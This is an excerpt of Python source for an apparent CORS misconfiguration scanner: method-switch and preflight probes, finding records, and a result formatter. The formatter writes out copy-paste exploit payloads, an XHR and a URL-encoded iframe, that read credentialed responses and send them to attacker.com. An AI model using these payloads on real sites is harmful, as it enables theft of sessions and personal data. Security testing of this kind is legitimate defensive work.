            _run_probe_list(self._CORS_PROBES,           "Standard + TLS-break + Intranet probes")
            _run_probe_list(self._CORS_XSS_CHAIN_PROBES, "XSS-via-CORS-trust probes")

            # ── Bypass #6: Method-switch probes ──────────────────────────
            # For each attacker origin, flip the HTTP method (GET->POST,
            # POST->GET) and check if CORS headers appear on the alternate
            # method. Some servers only run their CORS middleware on one
            # method, or route differently per method.
            if self.running:
                flipped_method = "POST" if method == "GET" else "GET"
                self.scan_progress.emit(
                    f"\n  -- Method-switch probes "
                    f"({method} -> {flipped_method}, "
                    f"{len(self._CORS_METHOD_SWITCH_ORIGINS)} origins) --"
                )

            for ms_tmpl in self._CORS_METHOD_SWITCH_ORIGINS:
                if not self.running:
                    break

                ms_origin  = ms_tmpl.format(
                    scheme=scheme, host=host,
                    host_nodot=host_nodot,
                    host_first_dot_x=host_first_dot_x,
                )
                ms_tc      = f"TC-MSWITCH-{flipped_method}-{ms_origin.replace(scheme+'://', '').replace('://', '')}"
                ms_desc    = (
                    f"Method-switch bypass: Origin '{ms_origin}' "
                    f"with {flipped_method} (original method was {method})"
                )

                headers_ms = dict(base_headers)
                headers_ms["origin"] = ms_origin

                self.scan_progress.emit(
                    f"  [MSWITCH][{ms_tc}] {method}->{flipped_method} Origin: {ms_origin}"
                )
                results["stats"]["probes_sent"] += 1

                resp_ms = self.send_request_with_traffic(
                    url             = full_url,
                    headers         = headers_ms,
                    method          = flipped_method,
                    payload         = ms_origin,
                    payload_type    = f"CORS-MethodSwitch-{flipped_method}",
                    allow_redirects = False,
                )

                if not resp_ms or not hasattr(resp_ms, "headers"):
                    continue

                acao_ms = (resp_ms.headers.get("Access-Control-Allow-Origin") or "").strip()
                acac_ms = (resp_ms.headers.get("Access-Control-Allow-Credentials") or "").lower().strip()
                acam_ms = (resp_ms.headers.get("Access-Control-Allow-Methods") or "").strip()
                vary_ms = (resp_ms.headers.get("Vary") or "").strip()

                with_creds_ms = (acac_ms == "true")
                ms_vuln = (
                    (acao_ms and acao_ms == ms_origin) or
                    (ms_origin == "null" and acao_ms == "null") or
                    acao_ms == "*"
                )

                if not ms_vuln:
                    self.scan_progress.emit(f"    OK  ACAO='{acao_ms}'")
                    continue

                combo = f"{ms_tc}|{acao_ms}|{acac_ms}"
                if combo in _seen:
                    continue
                _seen.add(combo)

                sev_ms       = _severity(with_creds_ms, "arbitrary")
                missing_vary = "origin" not in vary_ms.lower()
                ev_ms        = [
                    f"CORS header appears on {flipped_method} but not {method}: "
                    f"ACAO='{acao_ms}' -- method-specific CORS policy bypass"
                ]
                if with_creds_ms:
                    ev_ms.append("ACAC: true -- credential theft via method switch")
                if missing_vary:
                    ev_ms.append("Vary: Origin absent")

                poc_ms = _generate_poc_html(
                    url=full_url, origin=ms_origin, method=flipped_method,
                    with_credentials=with_creds_ms, test_case=ms_tc,
                )
                ms_finding = {
                    "test_case":      ms_tc,
                    "description":    ms_desc,
                    "origin_sent":    ms_origin,
                    "origin_class":   "arbitrary",
                    "auth_sent":      _has_auth,
                    "acao":           acao_ms,
                    "acac":           acac_ms,
                    "acam":           acam_ms,
                    "acah":           "",
                    "vary":           vary_ms,
                    "missing_vary":   missing_vary,
                    "status_code":    resp_ms.status_code,
                    "confidence":     "HIGH" if with_creds_ms else "MEDIUM",
                    "severity":       sev_ms["label"],
                    "severity_score": sev_ms["score"],
                    "evidence":       " | ".join(ev_ms),
                    "url":            full_url,
                    "poc_html":       poc_ms,
                    "repro_curl":     _build_repro_curl(
                        method=flipped_method, url=full_url, origin=ms_origin,
                        base_headers=base_headers, has_auth=_has_auth,
                    ),
                    "remediation": (
                        f"CORS policy is inconsistent across HTTP methods. "
                        f"The {flipped_method} method returns permissive CORS headers "
                        f"while {method} does not. Apply the same strict origin allowlist "
                        f"to ALL HTTP methods in your CORS middleware."
                    ),
                }
                results["vulnerable"] = True
                results["stats"]["hits"] += 1
                results["details"].append(ms_finding)
                results["pocs"][ms_tc] = poc_ms
                self.scan_progress.emit(
                    f"    FINDING [{sev_ms['label']}] {' | '.join(ev_ms)}"
                )

            # ── OPTIONS preflight probes ──────────────────────────────────
            if self.running:
                self.scan_progress.emit("\n  -- OPTIONS preflight probes --")

            for pf_tmpl in self._CORS_PREFLIGHT_ORIGINS:
                if not self.running:
                    break

                pf_origin = pf_tmpl.format(scheme=scheme, host=host)
                tc_label  = "PF-" + pf_origin.replace(f"{scheme}://", "").replace("://", "")

                self.scan_progress.emit(f"  [Preflight] OPTIONS -- Origin: {pf_origin}")
                results["stats"]["probes_sent"] += 1

                pf_headers = dict(base_headers)
                pf_headers["origin"]                          = pf_origin
                pf_headers["access-control-request-method"]  = method
                pf_headers["access-control-request-headers"] = (
                    "Authorization, Content-Type, X-Custom-Header"
                )

                resp_pre = self.send_request_with_traffic(
                    url             = full_url,
                    headers         = pf_headers,
                    method          = "OPTIONS",
                    payload         = pf_origin,
                    payload_type    = "CORS-Preflight",
                    allow_redirects = False,
                )

                if not resp_pre or not hasattr(resp_pre, "headers"):
                    continue

                acao_pre = (resp_pre.headers.get("Access-Control-Allow-Origin") or "").strip()
                acac_pre = (resp_pre.headers.get("Access-Control-Allow-Credentials") or "").lower().strip()
                acam_pre = (resp_pre.headers.get("Access-Control-Allow-Methods") or "").strip()
                acah_pre = (resp_pre.headers.get("Access-Control-Allow-Headers") or "").strip()
                vary_pre = (resp_pre.headers.get("Vary") or "").strip()

                with_creds_pre = (acac_pre == "true")
                pf_vuln = (
                    (acao_pre and acao_pre == pf_origin) or
                    (pf_origin == "null" and acao_pre == "null") or
                    acao_pre == "*"
                )

                if not pf_vuln:
                    self.scan_progress.emit(f"    OK  Preflight ACAO='{acao_pre}'")
                    continue

                combo = f"{tc_label}|{acao_pre}|{acac_pre}"
                if combo in _seen:
                    continue
                _seen.add(combo)

                sev_pre = _severity(with_creds_pre, "arbitrary")
                poc_pre = _generate_poc_html(
                    url=full_url, origin=pf_origin, method=method,
                    with_credentials=with_creds_pre, test_case=tc_label,
                )
                ev_parts = [f"OPTIONS ACAO reflects: '{acao_pre}'"]
                if with_creds_pre:
                    ev_parts.append("ACAC: true -- credential theft via preflight")
                if acam_pre:
                    ev_parts.append(f"Allowed methods: {acam_pre}")
                if acah_pre:
                    ev_parts.append(f"Allowed headers: {acah_pre}")
                if "origin" not in vary_pre.lower():
                    ev_parts.append("Vary: Origin absent")

                pf_finding = {
                    "test_case":      tc_label,
                    "description":    f"Preflight OPTIONS reflects '{pf_origin}'",
                    "origin_sent":    pf_origin,
                    "origin_class":   "arbitrary",
                    "auth_sent":      _has_auth,
                    "acao":           acao_pre,
                    "acac":           acac_pre,
                    "acam":           acam_pre,
                    "acah":           acah_pre,
                    "vary":           vary_pre,
                    "missing_vary":   "origin" not in vary_pre.lower(),
                    "status_code":    resp_pre.status_code,
                    "confidence":     "HIGH" if with_creds_pre else "MEDIUM",
                    "severity":       sev_pre["label"],
                    "severity_score": sev_pre["score"],
                    "evidence":       " | ".join(ev_parts),
                    "url":            full_url,
                    "poc_html":       poc_pre,
                    "repro_curl":     _build_repro_curl(
                        method="OPTIONS", url=full_url, origin=pf_origin,
                        base_headers=base_headers, has_auth=_has_auth,
                        extra_flags=(
                            f"-H 'Access-Control-Request-Method: {method}' "
                            f"-H 'Access-Control-Request-Headers: Authorization'"
                        ),
                    ),
                    "remediation": _remediation_tip("arbitrary", with_creds_pre),
                }
                results["vulnerable"] = True
                results["stats"]["hits"] += 1
                results["details"].append(pf_finding)
                results["pocs"][tc_label] = poc_pre
                self.scan_progress.emit(
                    f"    FINDING [{sev_pre['label']}] {' | '.join(ev_parts)}"
                )

        except Exception as e:
            logger.error(f"CORS scan error: {e}", exc_info=True)
            results["error"] = str(e)

        # ── Sort and summarise ────────────────────────────────────────────────
        results["details"].sort(
            key=lambda d: d.get("severity_score", 0), reverse=True
        )

        n = len(results["details"])
        if results["vulnerable"]:
            crit = sum(1 for d in results["details"] if d.get("severity") == "CRITICAL")
            high = sum(1 for d in results["details"] if d.get("severity") == "HIGH")
            med  = sum(1 for d in results["details"] if d.get("severity") == "MEDIUM")
            ah   = results["stats"]["authenticated_hits"]
            results["summary"] = (
                f"CORS MISCONFIGURED -- {n} finding(s) "
                f"[CRITICAL={crit} HIGH={high} MEDIUM={med}] "
                f"| Auth-only: {ah} "
                f"| {results['stats']['probes_sent']} probes sent"
            )
        else:
            total_probes = (
                len(self._CORS_PROBES) +
                len(self._CORS_XSS_CHAIN_PROBES) +
                len(self._CORS_METHOD_SWITCH_ORIGINS)
            )
            results["summary"] = (
                f"No CORS misconfiguration detected "
                f"({results['stats']['probes_sent']} probes, "
                f"{total_probes} origin classes tested)"
            )

        self.scan_progress.emit(f"\n{'='*65}")
        self.scan_progress.emit(f"CORS SCAN COMPLETE: {results['summary']}")
        self.scan_progress.emit(f"{'='*65}")
        if results["pocs"]:
            self.scan_progress.emit(
                f"{len(results['pocs'])} PoC HTML file(s) available in results panel"
            )
        return results


# ─────────────────────────────────────────────────────────────────────────────
# format_cors_results  (paste into ScannerTab in scanner_tab.py)
# Replace the entire existing method of the same name.
# ─────────────────────────────────────────────────────────────────────────────

class _FormatMixin:
    """Namespace only — paste format_cors_results into ScannerTab."""

    def format_cors_results(self, result: Dict[str, Any]) -> List[str]:
        """Format CORS misconfiguration scan results."""
        lines = []

        if not result:
            lines.append("  No results available.")
            return lines

        if "error" in result and not result.get("details"):
            lines.append(f"  ❌ Error: {result['error']}")
            return lines

        vulnerable = result.get("vulnerable", False)
        summary    = result.get("summary", "")
        stats      = result.get("stats", {})

        lines.append(f"  Status  : {'⚠️  MISCONFIGURED' if vulnerable else '✓ NOT VULNERABLE'}")
        lines.append(f"  Summary : {summary}")
        lines.append(
            f"  Stats   : {stats.get('probes_sent', 0)} probe(s) sent | "
            f"{stats.get('hits', 0)} hit(s) | "
            f"Auth-only: {stats.get('authenticated_hits', 0)}"
        )
        lines.append("")

        if not vulnerable:
            lines.append("  ✓ All CORS probes returned safe responses.")
            lines.append("")
            lines.append("  Attack classes tested:")
            for entry in [
                "[A] Reflected arbitrary origin         TC-01, TC-19, TC-20, TC-23, TC-24",
                "[B] Whitelist bypass (suffix/prefix)   TC-02, TC-03, TC-16, TC-17, TC-18",
                "[B] Fused hostname bypass              TC-FUSE-01, TC-FUSE-02",
                "[B] Space/tab in origin                TC-SPACE-01 to TC-SPACE-03",
                "[B] Percent-encoded chars              TC-PCT-01 to TC-PCT-05",
                "[B] Slash/@ path confusion             TC-SLASH-01/02, TC-AT-01/02",
                "[C] Null origin whitelisted            TC-04, PF-null",
                "[D] XSS-via-CORS-trust chain           TC-XSS-01 to TC-XSS-05",
                "[E] Breaking TLS (HTTP subdomain)      TC-TLS-01 to TC-TLS-05",
                "[F] Intranet / private IP              TC-PRIV-01 to TC-PRIV-07",
                "[G] Localhost / loopback               TC-10 to TC-13",
                "[H] Scheme / port variations           TC-14, TC-15, TC-21 to TC-23",
                "[#6] Method-switch bypass              TC-MSWITCH-* (GET<->POST)",
                "[I] OPTIONS preflight                  PF-evil.com, PF-null, PF-sub.*",
            ]:
                lines.append(f"    {entry}")
            return lines

        details = result.get("details", [])

        _CONF_ORDER = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}
        sorted_details = sorted(
            details,
            key=lambda d: _CONF_ORDER.get(
                d.get("severity", d.get("confidence", "LOW")), 9
            )
        )

        lines.append(f"  ⚠️  {len(sorted_details)} finding(s):")
        lines.append("")

        for i, d in enumerate(sorted_details, 1):
            sev         = d.get("severity", d.get("confidence", "?"))
            sev_icon    = {"CRITICAL": "🔴", "HIGH": "🚨",
                           "MEDIUM": "⚠️", "LOW": "🔵"}.get(sev, "•")
            tc          = d.get("test_case", "?")
            desc        = d.get("description", "")
            origin      = d.get("origin_sent", "")
            acao        = d.get("acao", "")
            acac        = d.get("acac", "")
            acam        = d.get("acam", "")
            acah        = d.get("acah", "")
            vary        = d.get("vary", "")
            status      = d.get("status_code", "")
            evidence    = d.get("evidence", "")
            repro       = d.get("repro_curl", "")
            url         = d.get("url", "")
            auth_sent   = d.get("auth_sent", False)
            score       = d.get("severity_score", "")
            remediation = d.get("remediation", "")
            oclass      = d.get("origin_class", "")
            with_creds  = (acac == "true")
            is_wildcard = (acao == "*")

            # ── Finding header ────────────────────────────────────────────
            lines.append(f"  {'─' * 68}")
            lines.append(
                f"  [{i}] {sev_icon} [{sev}]"
                + (f"  score={score}/10" if score else "")
                + f"  {tc}"
            )
            lines.append(f"  {'─' * 68}")
            lines.append(f"       Description : {desc}")
            lines.append(f"       Attack Class: {_attack_class_label(oclass)}")
            lines.append(f"       Origin Sent : {origin}")
            lines.append(f"       ACAO        : {acao if acao else '(not present)'}")
            lines.append(f"       ACAC        : {acac if acac else '(not present)'}")
            if acam:
                lines.append(f"       ACAM        : {acam}")
            if acah:
                lines.append(f"       ACAH        : {acah}")
            lines.append(f"       Vary        : {vary if vary else '(not present)'}")
            lines.append(f"       HTTP Status : {status}")
            lines.append(f"       Auth Sent   : {'Yes (cookie/auth forwarded)' if auth_sent else 'No'}")
            lines.append(f"       Evidence    : {evidence}")
            lines.append(f"       URL         : {url}")
            lines.append("")

            # ── Repro curl ────────────────────────────────────────────────
            if repro:
                lines.append(f"       ⚡ Repro (curl):")
                lines.append(f"       {repro}")
            lines.append("")

            # ── Exploit snippets ──────────────────────────────────────────
            if with_creds or is_wildcard:
                attacker_origin = origin if origin != "null" else "https://attacker.com"
                log_host        = "attacker.com"
                method_str      = (acam or "").split(",")[0].strip()
                if method_str not in ("GET", "POST", "PUT", "DELETE", "PATCH"):
                    method_str = "GET"

                # Exploit 1: standalone XHR
                xhr_lines = [
                    f"var req = new XMLHttpRequest();",
                    f"req.onload = reqListener;",
                    f"req.open('{method_str.lower()}', '{url}', true);",
                    f"req.withCredentials = true;",
                    f"req.send();",
                    f"function reqListener() {{",
                    f"    location = '//{log_host}/log?key=' + this.responseText;",
                    f"}}",
                ]

                # Exploit 2: iframe sandbox (works for null origin)
                # The HTML inside data:text/html MUST be URL-encoded so the
                # browser correctly parses the data URI. We build the raw HTML
                # first (readable), then URL-encode it for the actual payload.
                iframe_html_raw = (
                    "<script>\n"
                    "var req = new XMLHttpRequest();\n"
                    "req.onload = reqListener;\n"
                    f"req.open('{method_str.lower()}', '{url}', true);\n"
                    "req.withCredentials = true;\n"
                    "req.send();\n"
                    "function reqListener() {\n"
                    f"    location = 'https://{log_host}/log?key=' + this.responseText;\n"
                    "}\n"
                    "</script>"
                )

                # URL-encode the inner HTML for the data: URI src attribute.
                # Must encode: spaces, <, >, ", ', {, }, \n, #, &
                _encode_map = {
                    " ":  "%20",
                    "\n": "%0A",
                    "<":  "%3C",
                    ">":  "%3E",
                    '"':  "%22",
                    "'":  "%27",
                    "{":  "%7B",
                    "}":  "%7D",
                    "#":  "%23",
                    "&":  "%26",
                    "=":  "%3D",
                    "+":  "%2B",
                }
                iframe_html_encoded = iframe_html_raw
                for char, enc in _encode_map.items():
                    iframe_html_encoded = iframe_html_encoded.replace(char, enc)

                iframe_exploit_encoded = (
                    f'<iframe sandbox="allow-scripts allow-top-navigation allow-forms" '
                    f'src="data:text/html,{iframe_html_encoded}"></iframe>'
                )

                # Also build a clean readable version (line-broken) for display
                iframe_exploit_readable = (
                    f'<iframe sandbox="allow-scripts allow-top-navigation allow-forms"\n'
                    f'  src="data:text/html,\n'
                    f'    {iframe_html_raw.strip()}\n'
                    f'  ">\n'
                    f'</iframe>'
                )

                # XSS-chain specific exploit hint
                xss_hint = ""
                if oclass == "xss_chain":
                    xss_hint = (
                        f"       ⚠️  XSS chain: find XSS on {origin}, "
                        f"then inject the script below.\n"
                        f"       URL:  {origin}/?xss=<script>CORS-SCRIPT-HERE</script>\n"
                    )

                # TLS-break specific hint
                tls_hint = ""
                if oclass == "tls_break":
                    tls_hint = (
                        f"       ⚠️  TLS break: requires MITM position on "
                        f"HTTP traffic to {origin}.\n"
                        f"       Intercept victim HTTP request → inject CORS "
                        f"request to {url}\n"
                    )

                lines.append(f"       💀 Exploit 1 — Standalone XHR script")
                lines.append(f"       {'─' * 52}")
                lines.append(f"       Host on: {attacker_origin}/exploit.js")
                if xss_hint:
                    lines.append(xss_hint)
                if tls_hint:
                    lines.append(tls_hint)
                for el in xhr_lines:
                    lines.append(f"       {el}")
                lines.append("")

                lines.append(f"       💀 Exploit 2 — iframe sandbox (null origin / data: URI)")
                lines.append(f"       {'─' * 52}")
                lines.append(f"       Works when ACAO: null is accepted (sandboxed iframe sends null origin).")
                lines.append(f"       Host on any attacker page and deliver to victim.")
                lines.append("")
                lines.append(f"       [ Readable version — for understanding ]")
                for rline in iframe_exploit_readable.splitlines():
                    lines.append(f"       {rline}")
                lines.append("")
                lines.append(f"       [ Copy-paste ready — URL-encoded data: URI ]")
                lines.append(f"       {iframe_exploit_encoded}")
                lines.append("")

            # ── Remediation ───────────────────────────────────────────────
            if remediation:
                lines.append(f"       🔧 Remediation:")
                for rem_line in textwrap.wrap(remediation, 65):
                    lines.append(f"       {rem_line}")
            lines.append("")

        # ── Risk Summary ──────────────────────────────────────────────────
        lines.append(f"{'─' * 70}")
        lines.append("  📋 CORS Risk Summary")
        lines.append(f"{'─' * 70}")

        high_c    = [d for d in details if d.get("acac") == "true"]
        wildcard  = [d for d in details if d.get("acao") == "*"]
        high_nc   = [d for d in details
                     if d.get("confidence") == "HIGH" and d.get("acac") != "true"]
        xss_chain = [d for d in details if d.get("origin_class") == "xss_chain"]
        tls_break = [d for d in details if d.get("origin_class") == "tls_break"]
        private   = [d for d in details if d.get("origin_class") == "private_ip"]
        mswitch   = [d for d in details if "MSWITCH" in d.get("test_case", "")]
        med       = [d for d in details if d.get("confidence") == "MEDIUM"]
        no_vary   = [d for d in details if d.get("missing_vary")]

        if high_c:
            lines.append(
                f"  🔴 CRITICAL — {len(high_c)} finding(s) expose credentials cross-origin.\n"
                f"     Attacker page silently reads authenticated responses\n"
                f"     (sessions, tokens, PII) from a logged-in victim."
            )
        if wildcard:
            lines.append(
                f"  🚨 WILDCARD — {len(wildcard)} finding(s) use ACAO: *.\n"
                f"     Any origin on the internet can read these responses."
            )
        if xss_chain:
            lines.append(
                f"  🔗 XSS CHAIN — {len(xss_chain)} trusted subdomain(s) detected.\n"
                f"     An XSS vulnerability on any of these subdomains allows\n"
                f"     reading credentialed responses from this endpoint."
            )
        if tls_break:
            lines.append(
                f"  🔓 TLS BREAK — {len(tls_break)} HTTP subdomain(s) trusted on HTTPS endpoint.\n"
                f"     An attacker with MITM on HTTP traffic can inject a CORS\n"
                f"     request and read the HTTPS response."
            )
        if private:
            lines.append(
                f"  🏠 INTRANET — {len(private)} private IP/hostname(s) trusted.\n"
                f"     External attacker page can use victim browser as proxy\n"
                f"     to read internal resources."
            )
        if mswitch:
            # Extract original method from the first method-switch finding description
            _ms_desc  = mswitch[0].get("description", "")
            _orig_m   = "original method"
            _flip_m   = "alternate method"
            if "original method was" in _ms_desc:
                try:
                    _orig_m = _ms_desc.split("original method was")[1].strip().rstrip(")")
                    _flip_m = _ms_desc.split("with")[1].split("(")[0].strip()
                except Exception:
                    pass
            lines.append(
                f"  🔀 METHOD-SWITCH — {len(mswitch)} finding(s) where CORS policy differs\n"
                f"     by HTTP method. Endpoint restricts CORS on {_orig_m} but\n"
                f"     not on {_flip_m} — attacker flips method to bypass."
            )
        if high_nc:
            lines.append(
                f"  ⚠️  HIGH — {len(high_nc)} finding(s) reflect arbitrary origins\n"
                f"     without credentials. Non-auth data leakage possible."
            )
        if med:
            lines.append(
                f"  🔶 MEDIUM — {len(med)} finding(s) with partial misconfiguration."
            )
        if no_vary:
            lines.append(
                f"  📦 CACHE RISK — {len(no_vary)} finding(s) missing Vary: Origin.\n"
                f"     CDN may cache permissive response and serve to other origins."
            )
        lines.append("")

        return lines


def _attack_class_label(origin_class: str) -> str:
    """Human-readable attack class label for display."""
    return {
        "arbitrary":  "[A/B] Reflected / parser bypass",
        "subdomain":  "[B/D] Whitelist bypass / XSS chain",
        "null":       "[C] Null origin whitelisted",
        "xss_chain":  "[D] XSS-via-CORS-trust chain",
        "tls_break":  "[E] Breaking TLS (HTTP subdomain on HTTPS)",
        "private_ip": "[F] Intranet / private IP",
        "localhost":  "[G] Localhost",
        "loopback":   "[G] Loopback",
        "generic":    "[A] Wildcard-like policy",
    }.get(origin_class, origin_class)